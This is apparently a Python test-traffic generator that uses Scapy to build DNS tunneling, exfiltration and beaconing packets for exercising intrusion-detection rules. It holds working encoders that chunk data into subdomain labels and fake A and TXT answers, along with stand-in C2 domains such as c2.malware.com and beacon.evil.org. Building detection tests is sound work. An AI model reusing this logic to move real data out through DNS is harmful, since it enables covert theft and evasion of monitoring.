"""DNS packet builders for DNS tunneling and exfiltration.

Generates DNS traffic patterns that simulate:
- DNS tunneling (data encoded in queries/responses)
- DNS exfiltration (data in subdomain labels)
- DNS beaconing (periodic TXT queries)
- DNS fast-flux patterns

These patterns are designed to trigger DNS-based IDS rules.
"""

import base64
import random
import struct
from dataclasses import dataclass
from typing import Iterator

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.packet import Packet


# Suspicious TLD patterns used in DNS tunneling
TUNNELING_DOMAINS = [
    "data.exfil.net",
    "c2.malware.com",
    "tunnel.darknet.io",
    "beacon.evil.org",
    "transfer.covert.xyz",
]

# Base32 alphabet for DNS-safe encoding
BASE32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"


def encode_dns_safe(data: bytes, encoding: str = "base32") -> str:
    """Encode data for DNS-safe transmission.

    Args:
        data: Raw bytes to encode
        encoding: Encoding method (base32, hex, base64url)

    Returns:
        DNS-safe encoded string
    """
    if encoding == "base32":
        return base64.b32encode(data).decode().rstrip("=").lower()
    elif encoding == "hex":
        return data.hex()
    elif encoding == "base64url":
        return base64.urlsafe_b64encode(data).decode().rstrip("=")
    else:
        return data.hex()


def split_into_labels(data: str, max_label_len: int = 63) -> list[str]:
    """Split encoded data into DNS label chunks.

    DNS labels are limited to 63 characters each.

    Args:
        data: Encoded string to split
        max_label_len: Maximum label length

    Returns:
        List of label strings
    """
    return [data[i:i + max_label_len] for i in range(0, len(data), max_label_len)]


@dataclass
class DNSTunnelConfig:
    """Configuration for DNS tunneling."""

    base_domain: str = "tunnel.example.com"
    query_type: str = "TXT"  # TXT, A, AAAA, MX, CNAME
    encoding: str = "base32"  # base32, hex, base64url
    max_label_len: int = 63
    ttl: int = 300
    use_random_subdomain: bool = True  # Add random prefix
    add_timestamp: bool = True  # Include timestamp in query


@dataclass
class DNSExfilConfig:
    """Configuration for DNS exfiltration."""

    base_domain: str = "exfil.example.com"
    encoding: str = "hex"
    chunk_size: int = 180  # Max bytes per query (fits in labels)
    query_type: str = "A"  # Use A records for stealth


def build_dns_tunnel_query(
    src_ip: str,
    dns_server_ip: str,
    data: bytes,
    config: DNSTunnelConfig | None = None,
    src_port: int | None = None,
    transaction_id: int | None = None,
) -> Packet:
    """Build a DNS tunneling query packet.

    The data is encoded and placed in the subdomain portion of the query.

    Args:
        src_ip: Source IP (tunneling client)
        dns_server_ip: DNS server IP
        data: Data to tunnel
        config: Tunnel configuration
        src_port: Source port (random if None)
        transaction_id: DNS transaction ID

    Returns:
        Scapy DNS query packet
    """
    if config is None:
        config = DNSTunnelConfig()

    if src_port is None:
        src_port = random.randint(49152, 65535)

    if transaction_id is None:
        transaction_id = random.randint(0, 65535)

    # Encode the data
    encoded = encode_dns_safe(data, config.encoding)

    # Split into labels
    labels = split_into_labels(encoded, config.max_label_len)

    # Build query name
    subdomain_parts = labels[:4]  # Limit to avoid overly long names

    if config.add_timestamp:
        ts = struct.pack(">I", random.randint(0, 0xFFFFFFFF)).hex()[:8]
        subdomain_parts.insert(0, ts)

    if config.use_random_subdomain:
        prefix = "".join(random.choices("abcdefghijklmnop", k=8))
        subdomain_parts.insert(0, prefix)

    query_name = ".".join(subdomain_parts) + "." + config.base_domain

    # Map query type
    qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "MX": 15, "CNAME": 5, "NS": 2}
    qtype = qtype_map.get(config.query_type, 16)

    # Build packet
    ip = IP(src=src_ip, dst=dns_server_ip)
    udp = UDP(sport=src_port, dport=53)
    dns = DNS(
        id=transaction_id,
        qr=0,  # Query
        opcode=0,
        rd=1,  # Recursion desired
        qd=DNSQR(qname=query_name, qtype=qtype),
    )

    return ip / udp / dns


def build_dns_tunnel_response(
    dns_server_ip: str,
    dst_ip: str,
    query_name: str,
    response_data: bytes,
    config: DNSTunnelConfig | None = None,
    dst_port: int = 12345,
    transaction_id: int = 0,
) -> Packet:
    """Build a DNS tunneling response packet.

    For TXT records, data is encoded in the response.
    For A records, data is encoded in fake IP addresses.

    Args:
        dns_server_ip: DNS server IP
        dst_ip: Destination IP (client)
        query_name: Original query name
        response_data: Data to return
        config: Tunnel configuration
        dst_port: Destination port
        transaction_id: DNS transaction ID

    Returns:
        Scapy DNS response packet
    """
    if config is None:
        config = DNSTunnelConfig()

    ip = IP(src=dns_server_ip, dst=dst_ip)
    udp = UDP(sport=53, dport=dst_port)

    # Map query type
    qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "MX": 15, "CNAME": 5}
    qtype = qtype_map.get(config.query_type, 16)

    if config.query_type == "TXT":
        # Encode data in TXT record
        encoded = encode_dns_safe(response_data, config.encoding)
        rdata = encoded[:255]  # TXT record limit
        dns = DNS(
            id=transaction_id,
            qr=1,  # Response
            opcode=0,
            aa=1,  # Authoritative
            rd=1,
            ra=1,
            qd=DNSQR(qname=query_name, qtype=qtype),
            an=DNSRR(rrname=query_name, type="TXT", ttl=config.ttl, rdata=rdata),
        )
    elif config.query_type == "A":
        # Encode data in fake IP addresses
        # Each A record can hold 4 bytes
        rdata_list = []
        for i in range(0, min(len(response_data), 16), 4):
            chunk = response_data[i:i + 4].ljust(4, b"\x00")
            fake_ip = ".".join(str(b) for b in chunk)
            rdata_list.append(fake_ip)

        answers = []
        for fake_ip in rdata_list:
            answers.append(DNSRR(rrname=query_name, type="A", ttl=config.ttl, rdata=fake_ip))

        dns = DNS(
            id=transaction_id,
            qr=1,
            opcode=0,
            aa=1,
            rd=1,
            ra=1,
            qd=DNSQR(qname=query_name, qtype=1),
            an=answers[0] if answers else None,
        )
    else:
        # Generic response
        dns = DNS(
            id=transaction_id,
            qr=1,
            opcode=0,
            aa=1,
            rd=1,
            ra=1,
            qd=DNSQR(qname=query_name, qtype=qtype),
        )

    return ip / udp / dns


def build_dns_exfil_query(
    src_ip: str,
    dns_server_ip: str,
    data: bytes,
    chunk_index: int = 0,
    config: DNSExfilConfig | None = None,
    src_port: int | None = None,
) -> Packet:
    """Build a DNS exfiltration query.

    Data is chunked and encoded in subdomain labels.

    Args:
        src_ip: Source IP (exfiltrating client)
        dns_server_ip: DNS server (usually external)
        data: Data chunk to exfiltrate
        chunk_index: Index of this chunk
        config: Exfil configuration
        src_port: Source port

    Returns:
        Scapy DNS query packet
    """
    if config is None:
        config = DNSExfilConfig()

    if src_port is None:
        src_port = random.randint(49152, 65535)

    # Encode the data
    encoded = encode_dns_safe(data, config.encoding)
    labels = split_into_labels(encoded, 63)

    # Add chunk index and session ID
    session_id = random.randint(0, 0xFFFF)
    prefix = f"{session_id:04x}-{chunk_index:04x}"

    query_name = prefix + "." + ".".join(labels[:3]) + "." + config.base_domain

    ip = IP(src=src_ip, dst=dns_server_ip)
    udp = UDP(sport=src_port, dport=53)
    dns = DNS(
        id=random.randint(0, 65535),
        qr=0,
        opcode=0,
        rd=1,
        qd=DNSQR(qname=query_name, qtype=1),  # A record
    )

    return ip / udp / dns


def generate_dns_tunnel_sequence(
    src_ip: str,
    dns_server_ip: str,
    data_chunks: list[bytes],
    config: DNSTunnelConfig | None = None,
    start_time_ms: int = 0,
    interval_ms: int = 1000,
) -> Iterator[tuple[int, Packet]]:
    """Generate a sequence of DNS tunnel packets.

    Args:
        src_ip: Source IP
        dns_server_ip: DNS server IP
        data_chunks: List of data chunks to tunnel
        config: Tunnel configuration
        start_time_ms: Starting timestamp
        interval_ms: Interval between queries

    Yields:
        Tuple of (timestamp_ms, packet)
    """
    if config is None:
        config = DNSTunnelConfig()

    current_time = start_time_ms
    src_port = random.randint(49152, 65535)

    for i, chunk in enumerate(data_chunks):
        tx_id = random.randint(0, 65535)

        # Query
        query = build_dns_tunnel_query(
            src_ip=src_ip,
            dns_server_ip=dns_server_ip,
            data=chunk,
            config=config,
            src_port=src_port,
            transaction_id=tx_id,
        )
        yield (current_time, query)

        # Response delay (10-100ms)
        current_time += random.randint(10, 100)

        # Get query name from the query packet
        query_name = query[DNSQR].qname.decode() if DNSQR in query else config.base_domain

        # Response
        response = build_dns_tunnel_response(
            dns_server_ip=dns_server_ip,
            dst_ip=src_ip,
            query_name=query_name,
            response_data=b"OK",
            config=config,
            dst_port=src_port,
            transaction_id=tx_id,
        )
        yield (current_time, response)

        # Interval to next query
        jitter = int(interval_ms * 0.2)
        current_time += interval_ms + random.randint(-jitter, jitter)


def generate_dns_beacon_sequence(
    src_ip: str,
    dns_server_ip: str,
    beacon_domain: str = "beacon.c2.example.com",
    count: int = 10,
    interval_ms: int = 60000,
    start_time_ms: int = 0,
) -> Iterator[tuple[int, Packet]]:
    """Generate a DNS beaconing sequence.

    Simple TXT queries to a C2 domain at regular intervals.

    Args:
        src_ip: Source IP
        dns_server_ip: DNS server IP
        beacon_domain: Domain to query
        count: Number of beacons
        interval_ms: Beacon interval
        start_time_ms: Starting timestamp

    Yields:
        Tuple of (timestamp_ms, packet)
    """
    current_time = start_time_ms
    src_port = random.randint(49152, 65535)

    for i in range(count):
        tx_id = random.randint(0, 65535)

        # Add unique identifier to subdomain
        uid = f"{i:04x}.{random.randint(0, 0xFFFF):04x}"
        query_name = f"{uid}.{beacon_domain}"

        ip = IP(src=src_ip, dst=dns_server_ip)
        udp = UDP(sport=src_port, dport=53)
        dns = DNS(
            id=tx_id,
            qr=0,
            rd=1,
            qd=DNSQR(qname=query_name, qtype=16),  # TXT
        )

        yield (current_time, ip / udp / dns)

        # Response
        current_time += random.randint(10, 50)

        response = DNS(
            id=tx_id,
            qr=1,
            aa=1,
            rd=1,
            ra=1,
            qd=DNSQR(qname=query_name, qtype=16),
            an=DNSRR(rrname=query_name, type="TXT", ttl=60, rdata="OK"),
        )

        yield (current_time, IP(src=dns_server_ip, dst=src_ip) / UDP(sport=53, dport=src_port) / response)

        # Next beacon interval with jitter
        jitter = int(interval_ms * 0.15)
        current_time += interval_ms + random.randint(-jitter, jitter)
